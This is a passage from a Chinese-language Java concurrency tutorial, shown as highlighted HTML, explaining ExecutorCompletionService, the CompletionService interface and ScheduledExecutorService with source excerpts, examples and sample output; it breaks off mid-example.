	<span class="token keyword">if</span> <span class="token punctuation">(</span>executor <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>executor <span class="token operator">=</span> executor<span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>aes <span class="token operator">=</span> <span class="token punctuation">(</span>executor <span class="token keyword">instanceof</span> <span class="token class-name">AbstractExecutorService</span><span class="token punctuation">)</span> <span class="token operator">?</span>
		<span class="token punctuation">(</span><span class="token class-name">AbstractExecutorService</span><span class="token punctuation">)</span> executor <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>completionQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Future</span><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * Creates an ExecutorCompletionService using the supplied
 * executor for base task execution and the supplied queue as its
 * completion queue.
 *
 * @param executor the executor to use
 * @param completionQueue the queue to use as the completion queue
 *        normally one dedicated for use by this service. This
 *        queue is treated as unbounded -- failed attempted
 *        {@code Queue.add} operations for completed tasks cause
 *        them not to be retrievable.
 * @throws NullPointerException if executor or completionQueue are {@code null}
 */</span>
<span class="token keyword">public</span> <span class="token class-name">ExecutorCompletionService</span><span class="token punctuation">(</span><span class="token class-name">Executor</span> executor<span class="token punctuation">,</span>
								 <span class="token class-name">BlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Future</span><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> completionQueue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>executor <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> completionQueue <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>executor <span class="token operator">=</span> executor<span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>aes <span class="token operator">=</span> <span class="token punctuation">(</span>executor <span class="token keyword">instanceof</span> <span class="token class-name">AbstractExecutorService</span><span class="token punctuation">)</span> <span class="token operator">?</span>
		<span class="token punctuation">(</span><span class="token class-name">AbstractExecutorService</span><span class="token punctuation">)</span> executor <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>completionQueue <span class="token operator">=</span> completionQueue<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这两个构造方法都需要传入一个线程池，如果不指定 <code>completionQueue</code>，那么默认会使用无界的 <code>LinkedBlockingQueue</code>。任务执行结果的 Future 对象就是加入到 completionQueue 中。</p>
<blockquote>
<p>CompletionService 接口方法</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">CompletionService</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token comment">//提交线程任务</span>
    <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> task<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//提交线程任务</span>
    <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> task<span class="token punctuation">,</span> <span class="token class-name">V</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//阻塞等待</span>
    <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span>
    <span class="token comment">//非阻塞等待</span>
    <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//带时间的非阻塞等待</span>
    <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token keyword">long</span> timeout<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span> unit<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>submit(Callable task)：提交线程任务，交由 Executor 对象去执行，并将结果放入阻塞队列；</li>
<li>take()：在阻塞队列中获取并移除一个元素，该方法是阻塞的，即获取不到的话线程会一直阻塞；</li>
<li>poll()：在阻塞队列中获取并移除一个元素，该方法是非阻塞的，获取不到即返回 null ；</li>
<li>poll(long timeout, TimeUnit unit)：从阻塞队列中非阻塞地获取并移除一个元素，在设置的超时时间内获取不到即返回 null ；</li>
</ul>
<p>接下来，我们重点看一下submit 的源码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> task<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>task <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token class-name">RunnableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> f <span class="token operator">=</span> <span class="token function">newTaskFor</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
   executor<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">QueueingFuture</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> f<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从submit 方法的源码中可以确认两点：</p>
<ol>
<li>线程任务确实是由 Executor 对象执行的；</li>
<li>提交某个任务时，该任务首先将被包装为一个QueueingFuture。</li>
</ol>
<p>继续追查 <code>QueueingFuture</code>，可以发现： 该类重写了 FutureTask 的done方法，当计算完成时，把Executor执行的计算结果放入BlockingQueue中，而==放入结果是按任务完成顺序来进行==的，即先完成的任务先放入阻塞队列。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token comment">/** 
  * FutureTask extension to enqueue upon completion 
  */</span>  
<span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">QueueingFuture</span> <span class="token keyword">extends</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>  
    <span class="token class-name">QueueingFuture</span><span class="token punctuation">(</span><span class="token class-name">RunnableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> task<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">super</span><span class="token punctuation">(</span>task<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>task <span class="token operator">=</span> task<span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> completionQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> task<span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由此，CompletionService 实现了生产者提交任务和消费者获取结果的解耦，任务的完成顺序由 CompletionService 来保证，消费者一定是按照任务完成的先后顺序来获取执行结果。</p>
<blockquote>
<p>CompletionService 使用示例</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Date</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletionServiceTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executor <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CompletionService</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> cs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExecutorCompletionService</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>executor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 此线程池运行5个线程</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> i<span class="token punctuation">;</span>
            cs<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 启动："</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">-</span> index <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> name<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        executor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cs<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 结果："</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span> 启动：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">13</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">4</span> 启动：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">13</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">3</span> 启动：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">13</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">5</span> 启动：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">13</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span> 启动：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">13</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">5</span> 结果：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">15</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">4</span> 结果：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">17</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">3</span> 结果：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">19</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span> 结果：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">21</span> <span class="token constant">CST</span> <span class="token number">2019</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span> 结果：<span class="token class-name">Sun</span> <span class="token class-name">Nov</span> <span class="token number">10</span> <span class="token number">11</span><span class="token operator">:</span><span class="token number">34</span><span class="token operator">:</span><span class="token number">23</span> <span class="token constant">CST</span> <span class="token number">2019</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ScheduledExecutorService">ScheduledExecutorService</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220726163319524-1667231117133-92.png" alt="image-20220726163319524"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
* 1秒后开始执行任务，每2秒执行一回
*/</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ScheduledExecutorServiceTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ScheduledExecutorService</span> scheduledExecutorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newScheduledThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//scheduledExecutorService.schedule(() -&gt; System.out.println(Thread.currentThread().getName()), 1, TimeUnit.SECONDS);</span>
        <span class="token class-name">AtomicLong</span> time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicLong</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scheduledExecutorService<span class="token punctuation">.</span><span class="token function">scheduleAtFixedRate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            time<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> time<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token number">5000</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token number">5000</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token number">5000</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token number">5001</span>
pool<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>thread<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token number">5000</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>ScheduledThreadPoolExecutor </code>特殊参数说明</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 允许现有周期性任务在Shutdown之后继续执行
 */</span>
<span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> continueExistingPeriodicTasksAfterShutdown<span class="token punctuation">;</span>

<span class="token comment">/**
 * 允许现有延时任务在Shutdown之后继续执行
 */</span>
<span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> executeExistingDelayedTasksAfterShutdown <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ScheduledExecutorServiceTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ScheduledThreadPoolExecutor</span> scheduledThreadPool <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ScheduledThreadPoolExecutor</span><span class="token punctuation">)</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newScheduledThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scheduledThreadPool<span class="token punctuation">.</span><span class="token function">setExecuteExistingDelayedTasksAfterShutdownPolicy</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//scheduledThreadPool.setContinueExistingPeriodicTasksAfterShutdownPolicy(true);</span>
        <span class="token keyword">final</span> <span class="token class-name">AtomicLong</span> time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicLong</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scheduledThreadPool<span class="token punctuation">.</span><span class="token function">scheduleAtFixedRate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
